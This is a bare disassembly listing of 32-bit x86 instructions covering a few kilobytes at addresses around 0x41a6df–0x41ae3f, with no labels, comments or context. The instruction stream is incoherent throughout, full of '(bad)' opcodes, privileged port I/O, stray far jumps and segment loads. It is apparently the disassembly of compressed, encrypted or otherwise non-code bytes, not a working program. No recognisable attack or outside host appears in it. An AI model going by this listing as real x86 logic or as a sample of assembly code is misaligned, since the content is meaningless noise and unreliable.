  41a6df:	sbb    eax,0x3c3ea767
  41a6e4:	outs   dx,BYTE PTR ds:[esi]
  41a6e5:	jb     0x41a6ce
  41a6e7:	ds (bad) 
  41a6e9:	call   0x7373:0xd0763b0d
  41a6f0:	clc    
  41a6f1:	repnz xchg esp,eax
  41a6f3:	(bad)  
  41a6f4:	retf   
  41a6f5:	mov    BYTE PTR [ebp-0x2a5f8f87],dl
  41a6fb:	inc    eax
  41a6fc:	sar    ch,cl
  41a6fe:	xchg   ebx,eax
  41a6ff:	scas   al,BYTE PTR es:[edi]
  41a700:	inc    edx
  41a701:	das    
  41a702:	arpl   di,dx
  41a704:	in     eax,0x44
  41a706:	sub    eax,0xf92e012e
  41a70b:	shl    DWORD PTR [ebp-0x29],cl
  41a70e:	mov    ebx,0x567c8712
  41a713:	lods   eax,DWORD PTR ds:[esi]
  41a714:	inc    ebx
  41a715:	push   es
  41a716:	sbb    eax,0x4d627182
  41a71b:	and    al,0xe4
  41a71d:	cmp    eax,0xd0f59284
  41a722:	(bad)  
  41a723:	pop    ecx
  41a724:	xchg   DWORD PTR [ecx+ecx*1-0x28],esp
  41a728:	ficom  WORD PTR ss:[esi-0xe480602]
  41a72f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a730:	mov    al,ds:0xf39487ab
  41a735:	push   ebx
  41a737:	cmp    DWORD PTR ds:0x62ffdb6e,esi
  41a73d:	out    dx,al
  41a73e:	jl     0x41a76d
  41a740:	cli    
  41a741:	daa    
  41a742:	mov    al,es:0xe0b441ee
  41a748:	outs   dx,BYTE PTR ds:[esi]
  41a749:	dec    ecx
  41a74a:	inc    edx
  41a74b:	push   ecx
  41a74c:	addr16 pop ebx
  41a74e:	push   0x987c7bb6
  41a753:	push   ecx
  41a754:	mov    ecx,0x3ba43adc
  41a759:	stos   DWORD PTR es:[edi],eax
  41a75a:	ror    DWORD PTR [edx],1
  41a75c:	(bad)  
  41a75d:	xor    eax,0x2052c40e
  41a762:	add    eax,0x504c13f7
  41a767:	sub    BYTE PTR [edx+ebx*2-0x608870ca],0x7
  41a76f:	add    DWORD PTR [eax],edi
  41a771:	cmp    cl,BYTE PTR [ebx-0x3a]
  41a774:	ins    DWORD PTR es:[edi],dx
  41a775:	lds    esp,FWORD PTR [edi]
  41a777:	lahf   
  41a778:	je     0x41a771
  41a77a:	sbb    eax,0x7aafbb99
  41a77f:	inc    esp
  41a780:	xchg   BYTE PTR [eax-0x402496d2],bl
  41a786:	icebp  
  41a787:	inc    ebp
  41a788:	xchg   edi,eax
  41a789:	retf   
  41a78a:	or     DWORD PTR ds:0x3202d491,esi
  41a790:	cs pop ebp
  41a792:	and    al,0x51
  41a794:	dec    edx
  41a795:	jb     0x41a806
  41a797:	fcomp  QWORD PTR [edx+0x49f9ff4a]
  41a79d:	inc    edi
  41a79e:	mov    dh,0x7f
  41a7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7a1:	dec    esp
  41a7a2:	mov    al,BYTE PTR [esi]
  41a7a4:	sahf   
  41a7a5:	lahf   
  41a7a6:	or     DWORD PTR [eax],edi
  41a7a8:	popa   
  41a7a9:	scas   al,BYTE PTR es:[edi]
  41a7aa:	out    0x87,al
  41a7ac:	pop    ecx
  41a7ad:	jmp    0x1616:0x8d6bb069
  41a7b4:	or     bh,dh
  41a7b6:	test   BYTE PTR [ebp+0x79],al
  41a7b9:	(bad)  
  41a7ba:	dec    eax
  41a7bb:	inc    edi
  41a7bc:	push   esp
  41a7bd:	fild   WORD PTR [esi]
  41a7bf:	leave  
  41a7c0:	imul   edx,DWORD PTR [ebp+ecx*8-0x36],0x784f41d2
  41a7c8:	aad    0x29
  41a7ca:	mov    eax,DWORD PTR [eax+0x48]
  41a7cd:	mov    dh,0x8a
  41a7cf:	or     DWORD PTR [eax],edi
  41a7d1:	sti    
  41a7d2:	pop    eax
  41a7d3:	and    BYTE PTR [ebx+0x489adacc],ah
  41a7d9:	or     BYTE PTR [edx+0x62],cl
  41a7dc:	test   DWORD PTR [ebx],ebp
  41a7de:	pusha  
  41a7df:	adc    eax,0xbcbe675c
  41a7e4:	shl    DWORD PTR [edx-0x5],1
  41a7e7:	movnti DWORD PTR [ebx+0x49124fb1],esi
  41a7ee:	outs   dx,BYTE PTR ds:[esi]
  41a7ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7f0:	inc    ebp
  41a7f1:	add    DWORD PTR [eax],0x1d
  41a7f4:	cli    
  41a7f5:	adc    cl,0x21
  41a7f8:	push   ss
  41a7f9:	int    0xce
  41a7fb:	cli    
  41a7fc:	cmp    BYTE PTR ds:0xa5cf9d00,cl
  41a802:	fnstcw WORD PTR [ebx+edi*1]
  41a805:	(bad)  
  41a807:	and    al,0x36
  41a809:	std    
  41a80a:	ja     0x41a7cf
  41a80c:	xor    al,0x69
  41a80e:	xor    eax,0xf0117a06
  41a814:	jmp    0x41a81a
  41a816:	mov    ah,0x67
  41a818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a819:	inc    eax
  41a81a:	push   ss
  41a81b:	pop    DWORD PTR [edi-0x28dd66ea]
  41a821:	xchg   edi,eax
  41a822:	jge    0x41a801
  41a824:	push   esi
  41a825:	sbb    dl,dh
  41a827:	scas   al,BYTE PTR es:[edi]
  41a828:	fsubr  DWORD PTR [ecx-0x58]
  41a82b:	adc    eax,0x2326796a
  41a830:	xor    dh,BYTE PTR [eax-0x568ee8ea]
  41a836:	test   BYTE PTR [ecx+0x7891330f],ch
  41a83c:	out    0x5,al
  41a83e:	mov    edi,0xffbbc653
  41a843:	xor    DWORD PTR [ebp-0x32],ebx
  41a846:	mov    ah,0xec
  41a848:	sbb    DWORD PTR [edx],esi
  41a84a:	int3   
  41a84b:	les    esp,FWORD PTR ds:0x1bbba101
  41a851:	adc    bh,al
  41a853:	xor    esp,DWORD PTR [esp+ebp*2-0x1f]
  41a857:	fs jge 0x41a89d
  41a85a:	jg     0x41a7f7
  41a85c:	sub    ebp,esi
  41a85e:	ins    BYTE PTR es:[edi],dx
  41a85f:	mov    al,0xca
  41a861:	retf   0x2fcb
  41a864:	test   BYTE PTR [eax-0x26bde557],bl
  41a86a:	pop    ebp
  41a86b:	mov    ah,0xa6
  41a86d:	out    0x65,eax
  41a86f:	xchg   edx,eax
  41a870:	ins    DWORD PTR es:[edi],dx
  41a871:	jae    0x41a879
  41a873:	and    bl,BYTE PTR [edx+0x56]
  41a876:	pop    esi
  41a877:	test   BYTE PTR [ebx],al
  41a879:	std    
  41a87a:	retf   
  41a87b:	dec    eax
  41a87c:	mov    ds:0x7d17554c,al
  41a881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a882:	pop    ebx
  41a883:	cmp    ecx,0x35569409
  41a889:	scas   eax,DWORD PTR es:[edi]
  41a88a:	in     eax,0x72
  41a88c:	cdq    
  41a88d:	enter  0x83cc,0xda
  41a891:	rol    DWORD PTR [esi],cl
  41a893:	sub    ebx,DWORD PTR [edi+0x3b9dd96c]
  41a899:	rcr    edi,cl
  41a89b:	int    0xa4
  41a89d:	(bad)  
  41a89e:	sub    al,0x98
  41a8a0:	mov    ebp,0x4db13222
  41a8a5:	cli    
  41a8a6:	pop    esi
  41a8a7:	mov    DWORD PTR [ebx+0x7ddd5c6c],esi
  41a8ad:	mov    edx,0xea7b2b36
  41a8b2:	pop    eax
  41a8b3:	mov    ds:0x2bee8a8e,eax
  41a8b8:	mul    BYTE PTR [edi]
  41a8ba:	mov    ebp,0xcf282204
  41a8bf:	mov    ds:0xebcccba6,al
  41a8c4:	push   ebp
  41a8c5:	mov    WORD PTR ds:0x623f27df,fs
  41a8cb:	add    eax,0x1f926f54
  41a8d0:	jb     0x41a8ea
  41a8d2:	jle    0x41a8f4
  41a8d4:	shl    eax,cl
  41a8d6:	ror    DWORD PTR [edx-0x26d959ee],0x61
  41a8dd:	daa    
  41a8de:	fcmovbe st,st(1)
  41a8e0:	jmp    0x306c:0x1e4f4f5f
  41a8e7:	mov    ds:0x88b4287a,al
  41a8ec:	fldcw  WORD PTR [ebp+0x14]
  41a8ef:	fistp  QWORD PTR [edi+0xb562ef4]
  41a8f5:	mov    esp,DWORD PTR [ebx]
  41a8f7:	in     al,0xaf
  41a8f9:	retf   
  41a8fa:	imul   ebx,DWORD PTR [edi+0x235143c1],0xffffffce
  41a901:	xchg   DWORD PTR [eax],eax
  41a903:	mov    ch,0xf6
  41a905:	dec    esi
  41a906:	ret    0xbc25
  41a909:	sbb    edi,DWORD PTR [ecx]
  41a90b:	sub    eax,0x1f488d13
  41a910:	hlt    
  41a911:	or     ecx,0xaa30212b
  41a917:	jne    0x41a90d
  41a919:	repz dec edx
  41a91b:	sahf   
  41a91c:	int    0x9a
  41a91e:	fdivr  DWORD PTR [edx+0x538b465]
  41a924:	push   cs
  41a925:	cmp    ebp,DWORD PTR [edx]
  41a927:	cmp    BYTE PTR [esi-0x5994fa86],0x70
  41a92e:	mov    ecx,ss
  41a930:	mov    dl,bl
  41a932:	sbb    al,0xa1
  41a934:	out    dx,al
  41a935:	push   ss
  41a936:	xchg   ebp,eax
  41a937:	jge    0x41a969
  41a939:	add    DWORD PTR [ecx],0x2a
  41a93c:	xlat   BYTE PTR ds:[ebx]
  41a93d:	idiv   BYTE PTR [eax+ebx*1]
  41a940:	lea    esi,[esp+esi*2+0x6dffdcda]
  41a947:	leave  
  41a948:	adc    ch,BYTE PTR [ecx+0x6ce9dfa3]
  41a94e:	push   si
  41a950:	mov    edi,0x3ad9b327
  41a955:	push   ds
  41a956:	cdq    
  41a957:	scas   eax,DWORD PTR es:[edi]
  41a958:	icebp  
  41a959:	push   cs
  41a95a:	xlat   BYTE PTR ds:[ebx]
  41a95b:	mov    edx,0xfe0dbf91
  41a960:	xchg   bl,dl
  41a962:	out    dx,eax
  41a963:	or     eax,0x754f71a8
  41a968:	fmulp  st(6),st
  41a96a:	(bad)  
  41a96b:	dec    edi
  41a96c:	mov    esi,0x78e96cfb
  41a971:	enter  0xc935,0x51
  41a975:	stos   DWORD PTR es:[edi],eax
  41a976:	pop    edi
  41a977:	sub    DWORD PTR [edx+0x7a],esi
  41a97a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a97b:	ja     0x41a9ec
  41a97d:	jge    0x41a9fe
  41a97f:	inc    ecx
  41a980:	frstor [ebx-0x23309506]
  41a986:	in     eax,dx
  41a987:	and    bl,BYTE PTR [esi+0x51]
  41a98a:	and    DWORD PTR [ecx-0x2c],ebx
  41a98d:	push   0xe90fbe8c
  41a992:	dec    esi
  41a993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a994:	jg     0x41a9a6
  41a996:	popa   
  41a997:	push   esp
  41a998:	and    dh,cl
  41a99a:	xor    DWORD PTR [ebp+ecx*8-0x1ed2e6b1],esi
  41a9a1:	sti    
  41a9a2:	fisttp WORD PTR [ebx-0x557ae85c]
  41a9a8:	pop    esp
  41a9a9:	and    edi,DWORD PTR ds:0xc922b9e2
  41a9af:	inc    edi
  41a9b0:	or     ebx,edi
  41a9b2:	data16 lahf 
  41a9b4:	cmp    esp,DWORD PTR [eax-0x2e]
  41a9b7:	pusha  
  41a9b8:	adc    eax,0x44a19fcc
  41a9bd:	add    al,0xed
  41a9bf:	jmp    0xed8d3cab
  41a9c4:	or     eax,0x55924296
  41a9c9:	int3   
  41a9ca:	cmc    
  41a9cb:	xor    dl,BYTE PTR [ecx]
  41a9cd:	out    0x5d,al
  41a9cf:	inc    ebp
  41a9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9d1:	(bad)  
  41a9d2:	adc    eax,0xb6c90977
  41a9d7:	mov    ebx,0xc3f0a246
  41a9dc:	xchg   esi,eax
  41a9dd:	jae    0x41aa24
  41a9df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9e0:	mov    ds:0xd22af84c,eax
  41a9e5:	push   es
  41a9e6:	mov    esp,0xc5890f4d
  41a9eb:	(bad)  
  41a9ec:	fsubr  QWORD PTR [edx]
  41a9ee:	loopne 0x41a972
  41a9f0:	mov    ds:0x9bb5e4eb,eax
  41a9f5:	pop    edx
  41a9f6:	test   eax,0x50f7094f
  41a9fb:	cs inc eax
  41a9fd:	mov    edi,DWORD PTR [ecx-0x11]
  41aa00:	shl    eax,cl
  41aa02:	cmp    ah,BYTE PTR [esi+0x5c]
  41aa05:	daa    
  41aa06:	xchg   esi,eax
  41aa07:	popf   
  41aa08:	push   esp
  41aa09:	test   ah,cl
  41aa0b:	pusha  
  41aa0c:	paddw  mm4,QWORD PTR [esi+0x21]
  41aa10:	fnstenv [edi-0x496d6816]
  41aa16:	xchg   ecx,eax
  41aa17:	add    eax,0x36a3594e
  41aa1c:	sbb    al,0xf3
  41aa1e:	dec    esi
  41aa1f:	jle    0x41aa70
  41aa21:	pop    ecx
  41aa22:	sbb    al,0xc7
  41aa24:	sbb    DWORD PTR [ecx],ecx
  41aa26:	sbb    DWORD PTR [ecx+0x3198d167],ebx
  41aa2c:	jo     0x41aa21
  41aa2e:	hlt    
  41aa2f:	faddp  st(5),st
  41aa31:	mov    eax,DWORD PTR [esi+0x10]
  41aa34:	out    dx,al
  41aa35:	cmp    al,0xcb
  41aa37:	ds push cs
  41aa39:	jnp    0x41aa97
  41aa3b:	adc    eax,0x5baa9a4f
  41aa40:	stc    
  41aa41:	mov    al,0xaa
  41aa43:	cmp    eax,0x85c3a3f6
  41aa48:	sbb    al,0x79
  41aa4a:	push   ss
  41aa4b:	jbe    0x41aa8c
  41aa4d:	jbe    0x41a9e2
  41aa4f:	jge    0x41aa8f
  41aa51:	jecxz  0x41aac9
  41aa53:	mov    BYTE PTR [edi+0x4dc99beb],0xe3
  41aa5a:	mov    bl,0xbd
  41aa5c:	(bad)  
  41aa5d:	mov    al,0xe7
  41aa5f:	into   
  41aa60:	dec    DWORD PTR [eax+0x6c]
  41aa63:	xor    DWORD PTR [edx+0x2e4975ff],esp
  41aa69:	adc    al,0x67
  41aa6b:	out    0xdb,eax
  41aa6d:	fsubr  DWORD PTR [ecx+0x6e]
  41aa70:	or     dh,BYTE PTR ds:0x946a2db4
  41aa76:	stc    
  41aa77:	outs   dx,BYTE PTR ds:[esi]
  41aa78:	or     edx,DWORD PTR [edi-0x71]
  41aa7b:	cwde   
  41aa7c:	in     al,0xde
  41aa7e:	mov    ah,0xb4
  41aa80:	in     al,dx
  41aa81:	cmp    DWORD PTR [edi+0x502a8730],edx
  41aa87:	ror    BYTE PTR [esi+0x4b],cl
  41aa8a:	cdq    
  41aa8b:	pop    edi
  41aa8c:	out    dx,eax
  41aa8d:	xor    BYTE PTR [esi+ebp*8],ah
  41aa90:	mov    BYTE PTR [ebx+0x15dbca2d],0x15
  41aa97:	fisttp QWORD PTR ds:0x6506c439
  41aa9d:	xchg   ebx,eax
  41aa9e:	out    dx,eax
  41aa9f:	adc    ch,BYTE PTR [ebx+0x20a1703b]
  41aaa5:	ror    DWORD PTR [esi+0x39],cl
  41aaa8:	push   ds
  41aaa9:	jno    0x41aafb
  41aaab:	fdiv   st(3),st
  41aaad:	sahf   
  41aaae:	mov    ebx,0x886ed063
  41aab3:	jnp    0x41aa80
  41aab5:	ret    
  41aab6:	(bad)  
  41aab7:	out    dx,al
  41aab8:	push   0x41
  41aaba:	adc    esp,DWORD PTR [edx]
  41aabc:	xchg   esi,eax
  41aabd:	bnd jnp 0x41aab1
  41aac0:	imul   ecx,DWORD PTR [esi+0x1],0xd9431e80
  41aac7:	dec    edx
  41aac8:	scas   eax,DWORD PTR es:[edi]
  41aac9:	out    0x40,al
  41aacb:	mov    al,ds:0x82407e49
  41aad0:	pop    ebx
  41aad1:	cld    
  41aad2:	jle    0x41aad1
  41aad4:	outs   dx,BYTE PTR ds:[esi]
  41aad5:	add    DWORD PTR [eax-0x32d6478f],eax
  41aadb:	jmp    0x16dc5e80
  41aae0:	mov    ebx,edx
  41aae2:	in     eax,dx
  41aae3:	mov    al,ds:0x38c72b82
  41aae8:	test   BYTE PTR gs:[eax],cl
  41aaeb:	xchg   edi,eax
  41aaec:	cmp    dl,BYTE PTR [esp+edi*2-0x5aa73829]
  41aaf3:	mov    dl,0x97
  41aaf5:	popa   
  41aaf6:	jmp    0x41ab2e
  41aaf8:	jecxz  0x41aa88
  41aafa:	mov    eax,0xd061e18
  41aaff:	enter  0x7a93,0x39
  41ab03:	xchg   edi,ebx
  41ab05:	aad    0x2b
  41ab07:	sbb    al,0x8e
  41ab09:	popa   
  41ab0a:	enter  0xefe7,0x7
  41ab0e:	out    0xbe,eax
  41ab10:	sub    dl,BYTE PTR [edx-0x3e972329]
  41ab16:	(bad)  
  41ab17:	loop   0x41aabf
  41ab19:	int    0x92
  41ab1b:	and    eax,0x3c2c5924
  41ab20:	clc    
  41ab21:	call   0xb9df:0x9e989397
  41ab28:	dec    edx
  41ab29:	pop    eax
  41ab2a:	push   ebp
  41ab2b:	and    DWORD PTR [eax+0x60],ebx
  41ab2e:	stos   DWORD PTR es:[edi],eax
  41ab2f:	fwait
  41ab30:	xor    al,0x8f
  41ab32:	pop    ss
  41ab33:	mov    bl,0x5d
  41ab35:	sbb    DWORD PTR [ebx+0x51],esp
  41ab38:	out    dx,al
  41ab39:	sub    eax,0xdf642057
  41ab3e:	ins    DWORD PTR es:[edi],dx
  41ab3f:	mov    ds:0x423f42c6,eax
  41ab44:	jae    0x41aacc
  41ab46:	adc    al,0x7a
  41ab48:	out    dx,al
  41ab49:	enter  0xe76c,0x27
  41ab4d:	adc    esi,DWORD PTR [edx+edx*4]
  41ab50:	jg     0x41ab0a
  41ab52:	inc    ebp
  41ab53:	jp     0x41ab88
  41ab55:	dec    esp
  41ab56:	cmp    BYTE PTR [ebp-0x15],bh
  41ab59:	jecxz  0x41aaf1
  41ab5b:	lods   al,BYTE PTR ds:[esi]
  41ab5c:	adc    eax,0x68f6fbeb
  41ab61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab62:	dec    esi
  41ab63:	test   al,0x98
  41ab65:	xor    DWORD PTR [edx-0x6f],eax
  41ab68:	lds    ebp,FWORD PTR [edi+0x60]
  41ab6b:	pop    ds
  41ab6c:	shl    BYTE PTR [ebp+0x2e],0x46
  41ab70:	mov    ebx,0x5a50f0b1
  41ab75:	sbb    ebp,edx
  41ab77:	push   ss
  41ab78:	xlat   BYTE PTR ds:[ebx]
  41ab79:	pop    eax
  41ab7a:	dec    edx
  41ab7b:	ds fcmovnbe st,st(3)
  41ab7e:	out    0x90,eax
  41ab80:	add    ebp,DWORD PTR [esi+0xc]
  41ab83:	fldz   
  41ab85:	adc    al,0x3c
  41ab87:	fbstp  TBYTE PTR [edi-0xe]
  41ab8a:	sbb    eax,0x265ed53b
  41ab8f:	mov    bl,0x1d
  41ab91:	cmp    eax,0x9d828e8c
  41ab96:	xor    DWORD PTR [edx-0x1],esp
  41ab99:	xchg   ebx,ebp
  41ab9b:	jecxz  0x41ac12
  41ab9d:	jl     0x41ac03
  41ab9f:	jmp    0x7194cf8c
  41aba4:	mov    edx,0xc75a7d2b
  41aba9:	mov    dh,0xa8
  41abab:	cs retf 
  41abad:	mov    edi,0xfdfbe41b
  41abb2:	adc    al,0x8c
  41abb4:	push   0x9c95ed27
  41abb9:	daa    
  41abba:	aas    
  41abbb:	es test eax,0x47682aa4
  41abc1:	shl    ecx,1
  41abc3:	mov    edx,0x9a01cda7
  41abc8:	push   0x24
  41abca:	xor    DWORD PTR [ebp+0x58040ec6],esi
  41abd0:	xor    BYTE PTR [edi-0x76],al
  41abd3:	stos   DWORD PTR es:[edi],eax
  41abd4:	(bad)  
  41abd5:	iret   
  41abd6:	sar    BYTE PTR [esi],cl
  41abd8:	jp     0x41ac20
  41abda:	adc    bl,bl
  41abdc:	lds    esi,FWORD PTR [edx+0x75bdc1c]
  41abe2:	outs   dx,DWORD PTR ds:[esi]
  41abe3:	mov    al,0x27
  41abe5:	sub    al,cl
  41abe7:	(bad)  
  41abe9:	cmc    
  41abea:	adc    dh,BYTE PTR [ebp+0x75adab2e]
  41abf0:	retf   0xef8d
  41abf3:	(bad)  
  41abf4:	rcr    BYTE PTR [ecx+eax*1+0x6f],cl
  41abf8:	push   ss
  41abf9:	pop    edi
  41abfa:	pushf  
  41abfb:	cmp    ah,BYTE PTR [eax]
  41abfd:	div    DWORD PTR [edi]
  41abff:	test   eax,0x98960938
  41ac04:	sbb    al,0xa2
  41ac06:	js     0x41ac12
  41ac08:	in     al,dx
  41ac09:	outs   dx,BYTE PTR ds:[esi]
  41ac0a:	inc    DWORD PTR [ebx]
  41ac0c:	lods   al,BYTE PTR ds:[esi]
  41ac0d:	mov    ecx,eax
  41ac0f:	mov    bh,0xdd
  41ac11:	xchg   ecx,eax
  41ac12:	clc    
  41ac13:	xchg   ecx,eax
  41ac14:	mov    ds:0x33380306,eax
  41ac19:	gs sar al,0x21
  41ac1d:	jne    0x41abb8
  41ac1f:	or     ch,BYTE PTR [edx]
  41ac21:	out    0x4a,eax
  41ac23:	arpl   WORD PTR [ebx],cx
  41ac25:	rcr    BYTE PTR [eax],cl
  41ac27:	inc    ebx
  41ac28:	pop    ecx
  41ac29:	pop    edx
  41ac2a:	jne    0x41ac7d
  41ac2c:	stc    
  41ac2d:	in     eax,dx
  41ac2e:	add    DWORD PTR [esp+ecx*4],edi
  41ac31:	(bad)  
  41ac32:	fdivr  st(7),st
  41ac34:	push   ebx
  41ac35:	xchg   ebp,eax
  41ac36:	ins    BYTE PTR es:[edi],dx
  41ac37:	and    eax,0xc217b375
  41ac3c:	ja     0x41ac79
  41ac3e:	in     eax,0x6a
  41ac40:	cs out 0x54,al
  41ac43:	cmp    ebp,DWORD PTR [ebx+0x1159a71]
  41ac49:	loope  0x41ac50
  41ac4b:	dec    edx
  41ac4c:	and    DWORD PTR [esi+0x4a4d6d8f],eax
  41ac52:	add    BYTE PTR [edx+eiz*1-0x3c],dh
  41ac56:	inc    ebp
  41ac57:	xor    ebp,DWORD PTR [edx+edi*1-0x36]
  41ac5b:	repnz test DWORD PTR ds:0x6cae0732,0xe70d46bc
  41ac66:	cmp    eax,0x53196a39
  41ac6b:	dec    eax
  41ac6c:	lods   eax,DWORD PTR ds:[esi]
  41ac6d:	(bad)  
  41ac6e:	(bad)  
  41ac6f:	mov    eax,0xdeb5d061
  41ac74:	adc    eax,0xc2335cd9
  41ac79:	fwait
  41ac7a:	sub    cl,BYTE PTR [esp+ebp*1]
  41ac7d:	mov    ecx,0xc5ea41d9
  41ac82:	mov    gs,WORD PTR [edx]
  41ac84:	shr    BYTE PTR [ebx-0x2b],0xc9
  41ac88:	int3   
  41ac89:	int    0xe2
  41ac8b:	jns    0x41acf6
  41ac8d:	fidivr DWORD PTR [edi+0x33]
  41ac90:	inc    esp
  41ac91:	fs push esp
  41ac93:	push   0x8d359893
  41ac98:	into   
  41ac99:	adc    WORD PTR ds:0xf5d25b30,cx
  41aca0:	jmp    0xdfbe:0x4da21b5e
  41aca7:	iret   
  41aca8:	sti    
  41aca9:	adc    al,0xe7
  41acab:	pop    edx
  41acac:	in     eax,dx
  41acad:	pop    edi
  41acae:	clc    
  41acaf:	sbb    BYTE PTR [eax-0x15],al
  41acb2:	and    eax,ebx
  41acb4:	pop    ebp
  41acb5:	cmp    al,0x1d
  41acb7:	pop    eax
  41acb8:	gs cmp eax,0xfa25e03c
  41acbe:	std    
  41acbf:	jo     0x41ad0c
  41acc1:	stc    
  41acc2:	das    
  41acc3:	jmp    0x41aced
  41acc5:	mov    esi,0x68589c6c
  41acca:	pop    ss
  41accb:	jns    0x41accc
  41accd:	stc    
  41acce:	retf   0x1336
  41acd1:	mov    ch,0xfe
  41acd4:	scas   al,BYTE PTR es:[edi]
  41acd5:	pop    ecx
  41acd6:	xchg   ebp,eax
  41acd7:	cdq    
  41acd8:	inc    esi
  41acd9:	and    BYTE PTR [edi+0x1d8fc2d6],ah
  41acdf:	sbb    dl,BYTE PTR [ecx+0x2005996a]
  41ace5:	add    eax,DWORD PTR [ebp-0x6d092713]
  41aceb:	retf   
  41acec:	aam    0x8d
  41acee:	mov    ah,0x8a
  41acf0:	or     cl,BYTE PTR [eax-0x44]
  41acf3:	loop   0x41ad4a
  41acf5:	les    eax,FWORD PTR [ebx+ebp*8-0x3a2480aa]
  41acfc:	cmp    DWORD PTR [ebx],0x11
  41acff:	lahf   
  41ad00:	iret   
  41ad01:	js     0x41accb
  41ad03:	jae    0x41acb3
  41ad05:	mov    edx,0xac6cd300
  41ad0a:	js     0x41ad1e
  41ad0c:	jno    0x41acd0
  41ad0e:	mov    ds:0xdad4f705,al
  41ad13:	ss mov edi,gs
  41ad16:	out    dx,eax
  41ad17:	or     cl,BYTE PTR [ecx-0xa355d5a]
  41ad1d:	sbb    al,0xe5
  41ad1f:	adc    al,0x1e
  41ad21:	xor    DWORD PTR [edi],esi
  41ad23:	cmp    edx,ebx
  41ad25:	cmp    al,0x7f
  41ad27:	test   DWORD PTR [ecx*4+0x23a7c431],edi
  41ad2e:	imul   esp,DWORD PTR [eax],0x7fd7f0b5
  41ad34:	dec    ebp
  41ad35:	(bad)  
  41ad36:	mov    edi,0xae1377e6
  41ad3b:	lods   al,BYTE PTR ds:[esi]
  41ad3c:	dec    esi
  41ad3d:	loope  0x41acf2
  41ad3f:	jg     0x41ad94
  41ad41:	nop
  41ad42:	or     BYTE PTR [ecx],dh
  41ad44:	cmp    eax,0xc9f79d3d
  41ad49:	loope  0x41ad5a
  41ad4b:	dec    esp
  41ad4c:	rcl    DWORD PTR [esp+ecx*8-0x2650dd7d],cl
  41ad53:	pop    esp
  41ad54:	fsubr  st(0),st
  41ad56:	xchg   esi,eax
  41ad57:	cmp    bh,ah
  41ad59:	pop    DWORD PTR [esp+eiz*4+0x3e]
  41ad5d:	dec    edi
  41ad5e:	(bad)  
  41ad5f:	iret   
  41ad60:	pop    eax
  41ad61:	out    0x25,eax
  41ad63:	je     0x41add3
  41ad65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad66:	jae    0x41ad0a
  41ad68:	pop    ds
  41ad69:	push   edx
  41ad6a:	out    0x96,al
  41ad6c:	mov    cs,WORD PTR [edx-0x28cb7213]
  41ad72:	jp     0x41ad5f
  41ad74:	popa   
  41ad75:	and    eax,DWORD PTR [ecx+0x47]
  41ad78:	int    0x73
  41ad7a:	cli    
  41ad7b:	shl    BYTE PTR [ebp+0x39],0x15
  41ad7f:	pop    ds
  41ad80:	pop    ebp
  41ad81:	das    
  41ad82:	add    al,0x13
  41ad84:	mov    dh,BYTE PTR [ecx+0x75ba83e5]
  41ad8a:	(bad)  
  41ad8c:	mov    al,BYTE PTR [ecx]
  41ad8e:	jecxz  0x41ada9
  41ad90:	mov    esi,0x370f7b6e
  41ad95:	popa   
  41ad96:	data16 js 0x41adcd
  41ad99:	push   ds
  41ad9a:	jb     0x41ada5
  41ad9c:	xchg   esp,eax
  41ad9d:	mov    ebp,0xa643b47a
  41ada2:	dec    edi
  41ada3:	xchg   ebx,eax
  41ada4:	mov    ebp,0x1459583c
  41ada9:	inc    edx
  41adaa:	mul    BYTE PTR [ebx]
  41adac:	and    edi,0xffffff8f
  41adaf:	addr16 mov dl,0x3b
  41adb2:	mov    ds,ebx
  41adb4:	mov    ch,0x3c
  41adb6:	dec    ecx
  41adb7:	cdq    
  41adb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adb9:	repz xchg ebp,eax
  41adbb:	xchg   edx,eax
  41adbc:	add    eax,0xffece903
  41adc1:	cmp    bl,dh
  41adc3:	fadd   DWORD PTR [edi]
  41adc5:	fnstenv [esi-0x5c072298]
  41adcb:	out    dx,eax
  41adcc:	mov    dl,0xd9
  41adce:	xchg   DWORD PTR [ebx+eiz*4-0x1e],ebp
  41add2:	inc    cx
  41add4:	iret   
  41add5:	out    dx,eax
  41add6:	or     eax,0xb67bb39c
  41addb:	push   eax
  41addc:	mov    eax,0xf3f40504
  41ade1:	xchg   esi,eax
  41ade2:	fcmovbe st,st(4)
  41ade4:	cmp    ebx,DWORD PTR [edi-0xf]
  41ade7:	xor    DWORD PTR [edi+0x57648857],0xffffffa2
  41adee:	loopne 0x41ae38
  41adf0:	jnp    0x41ae5d
  41adf2:	inc    ecx
  41adf3:	fwait
  41adf4:	popf   
  41adf5:	mov    DWORD PTR [ebx+0x3],edi
  41adf8:	out    0x4f,eax
  41adfa:	mov    ebx,0x2abdaaa1
  41adff:	scas   eax,DWORD PTR es:[edi]
  41ae00:	dec    esp
  41ae01:	pop    eax
  41ae02:	stos   BYTE PTR es:[edi],al
  41ae03:	aad    0xdf
  41ae05:	nop
  41ae06:	xlat   BYTE PTR ds:[ebx]
  41ae07:	xchg   edx,eax
  41ae08:	xchg   edx,eax
  41ae09:	jmp    esp
  41ae0b:	inc    edx
  41ae0c:	dec    edi
  41ae0d:	sub    al,0xa9
  41ae0f:	fmul   st(3),st
  41ae11:	inc    ebp
  41ae12:	fptan  
  41ae14:	or     eax,0xc2cb4258
  41ae19:	lds    esp,FWORD PTR [edx-0x68f10df2]
  41ae1f:	test   eax,0x26445c3b
  41ae24:	mov    dh,0xc1
  41ae26:	in     al,dx
  41ae27:	jne    0x41ae92
  41ae29:	push   ebp
  41ae2a:	or     ebx,DWORD PTR [edi]
  41ae2c:	inc    edi
  41ae2d:	pop    ss
  41ae2e:	or     al,0x8a
  41ae30:	lds    esi,FWORD PTR ds:0x569f4ffc
  41ae36:	inc    esp
  41ae37:	into   
  41ae38:	jg     0x41ae59
  41ae3a:	jle    0x41ae41
  41ae3c:	and    DWORD PTR [ebx-0x9],ecx
  41ae3f:	inc    esi
